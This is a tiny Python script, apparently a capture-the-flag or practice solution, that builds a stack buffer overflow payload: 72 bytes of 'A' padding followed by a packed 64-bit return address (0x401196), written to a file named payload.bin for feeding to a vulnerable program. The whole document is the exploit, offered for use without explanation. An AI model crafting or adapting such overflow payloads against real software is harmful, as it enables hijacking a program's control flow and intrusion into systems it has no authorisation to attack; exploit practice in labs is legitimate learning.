import struct

addr = struct.pack('<Q', 0x0000000000401196)
payload = b'A' * 72 + addr

with open('payload.bin', 'wb') as f:
    f.write(payload)
